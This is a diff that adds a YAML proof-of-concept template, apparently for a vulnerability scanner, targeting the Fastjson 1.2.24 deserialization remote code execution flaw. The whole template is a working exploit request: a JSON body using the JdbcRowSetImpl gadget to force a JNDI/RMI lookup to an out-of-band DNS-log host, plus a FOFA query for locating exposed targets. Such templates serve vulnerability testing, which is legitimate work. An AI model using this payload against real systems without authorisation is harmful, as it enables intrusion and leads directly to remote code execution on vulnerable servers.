@@ -1,0 +1,20 @@
+id: poc-yaml-fastjson-1-2-24-rce
+info:
+  name: Fastjson 1.2.24 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  - DNSLOG
+  finger: fastjson
+  fofa: app="fastjson"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /
+  headers:
+    Content-Type: application/json
+  data: '{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{{.reverseDomain}}/1","autoCommit":true}}'
+  expression: reverse.Verify()
+transport: http
